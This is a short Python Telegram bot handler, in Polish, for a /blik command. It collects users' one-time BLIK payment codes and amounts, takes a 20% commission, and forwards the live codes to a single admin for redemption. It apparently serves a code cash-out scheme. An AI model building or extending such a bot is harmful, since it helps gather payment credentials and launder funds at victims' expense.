from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes
from telegram.constants import ParseMode

ADMIN_ID = 6691328140

async def blik(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 2:
        await update.message.reply_text("❗ Użycie: /blik <kod_blik> <kwota>")
        return

    kod, kwota_str = context.args
    try:
        kwota = float(kwota_str)
    except ValueError:
        await update.message.reply_text("Kwota musi być liczbą.")
        return

    profit = round(kwota * 0.20, 2)
    saldo = round(kwota - profit, 2)
    user = update.effective_user
    user_id = user.id
    username = user.username or user.first_name

    msg = (
        "💰 *NOWA WPŁATA BLIK*\n\n"
        f"👤 *User*: @{username}\n"
        f"💳 *Kwota*: {kwota:.2f} PLN\n"
        f"📉 *Do wypłaty (po 20% prowizji)*: {saldo:.2f} PLN\n"
        f"📈 *Profit*: {profit:.2f} PLN\n"
        f"🔢 *Kod BLIK*: {kod}\n\n"
        "⏳ *KOD PRZETWARZANY*"
    )

    keyboard = [
        [
            InlineKeyboardButton("✅ Akceptuj", callback_data=f"accept_{user_id}_{kwota}"),
            InlineKeyboardButton("❌ Odrzuć", callback_data=f"reject_{user_id}_{kwota}")
        ],
        [InlineKeyboardButton("🔙 Powrót do menu", callback_data="menu")]
    ]
    markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(chat_id=ADMIN_ID, text=msg, parse_mode=ParseMode.MARKDOWN, reply_markup=markup)

    potwierdzenie = (
        f"📨 Twój kod BLIK został wysłany do weryfikacji!\n"
        f"💬 Kod: {kod}\n"
        f"💰 Kwota: {kwota:.2f} zł\n"
        f"⏳ Oczekuj na zatwierdzenie przez admina..."
    )
    await update.message.reply_text(potwierdzenie, parse_mode='Markdown')